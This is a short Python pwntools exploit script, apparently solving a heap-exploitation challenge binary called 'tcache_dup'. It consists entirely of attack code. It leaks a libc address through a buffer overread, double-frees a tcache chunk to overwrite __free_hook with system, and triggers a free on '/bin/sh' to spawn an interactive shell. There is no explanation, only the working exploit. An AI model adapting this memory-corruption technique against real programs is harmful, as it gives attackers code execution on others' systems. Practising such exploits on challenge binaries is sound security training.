#!/usr/bin/env python3
from pwn import *

def create(size):
    p.sendlineafter(b'# ', '1')
    p.sendlineafter(b'size:', str(size))

def get():
    p.sendlineafter(b'# ', '2')
    p.recvuntil(b'g_ptrs: ')
    return p.recvline()[:-1]

def set(payload):
    p.sendlineafter(b'# ', '3')
    p.sendafter(b'str:', payload)

def delete():
    p.sendlineafter(b'# ', '4')

def bye():
    p.sendlineafter(b'# ', '5')

p = process('./tcache_dup')

# Leak Libc
payload = b'a' * 0x78
p.sendafter(b'Name:', payload)
p.recvuntil(payload)
libc = u64(p.recv(6).ljust(8, b'\0')) - 0x21b97

log.info(hex(libc))

system = libc + 0x4f4e0
__free_hook = libc + 0x3ed8e8

# Use Tcache Dup
create(0x30)
delete()
delete()
create(0x30)
set(p64(__free_hook))
create(0x30)
create(0x30)
set(p64(system))
create(0x40)
set(b'/bin/sh\0')
delete()

p.interactive()
